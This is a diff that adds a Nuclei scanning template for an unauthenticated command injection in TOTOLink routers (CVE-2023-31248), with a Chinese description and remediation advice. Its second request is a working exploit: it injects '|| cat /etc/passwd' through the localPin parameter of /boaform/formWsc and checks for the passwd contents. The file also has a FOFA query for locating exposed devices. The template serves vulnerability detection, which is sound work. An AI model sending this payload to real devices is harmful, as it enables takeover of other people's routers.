@@ -1,0 +1,50 @@
+id: totolink-router-formwsc-command-injection
+
+info:
+  name: TOTOLink Router 命令注入漏洞
+  author: ritikchaddha
+  severity: critical
+  description: |
+    TOTOLink 路由器存在未授权远程命令注入漏洞，攻击者可通过 /boaform/formWsc 接口的 localPin 参数注入系统命令，进而完全控制设备。参考链接：https://nvd.nist.gov/vuln/detail/CVE-2023-31248
+  reference:
+    - https://github.com/fizz-is-on-the-way/Iot_vuls/blob/main/N150RT/RCE_formWsc/README.md
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    max-request: 2
+    product: TOTOLINK
+    fofa-query: title="TOTOLINK"
+  tags: TOTO_LINK
+  remediation: >-
+    升级到包含漏洞修复的最新厂商支持版本。在完成升级前，限制对受影响端点的访问，尽可能禁用存在风险的功能，落实最小权限原则，并监控可疑的进程执行行为。
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200'
+          - 'contains(tolower(body), "totolink")'
+        condition: and
+        internal: true
+  - raw:
+      - |
+        POST /boaform/formWsc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        status:
+          - 200
+        # digest: 490a00463044022026fc3961037dc9aa4f40fd2655a353e6ff4de5052ff3a053a278aa7c87eb2ce50220330d125dbc63ecd8ffec5a5fa671b178651c8a770c20a976a00add8aabdce43f:922c64590222798bb761d5b6d8e72950
